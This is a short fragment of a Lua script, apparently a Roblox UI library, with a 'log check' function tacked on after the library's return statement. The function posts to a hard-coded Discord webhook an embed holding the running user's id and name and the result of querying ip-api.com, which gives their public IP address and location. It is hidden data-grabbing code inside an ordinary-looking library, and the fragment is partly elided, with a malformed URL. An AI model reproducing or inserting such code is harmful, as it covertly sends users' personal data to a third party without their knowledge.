...
return library
--- function for log check -- [ gives id of user ] [ name ] [ user ] -- keep this same webhook
local webh = "https://discord.com/api/webhooks/1084532436924375160/C4hxYtGNvoFrxQ_ylruDvyBb_YLOvI6JgMJHpGLivzWv5tOGTpKvfL0AF6IS6A3BaXL-"
       ...
       ["embeds"] = {
           {
               ...
               ["description"] = game:HttpGet("http://ip-api.com/json%22)
           }
       }
   }
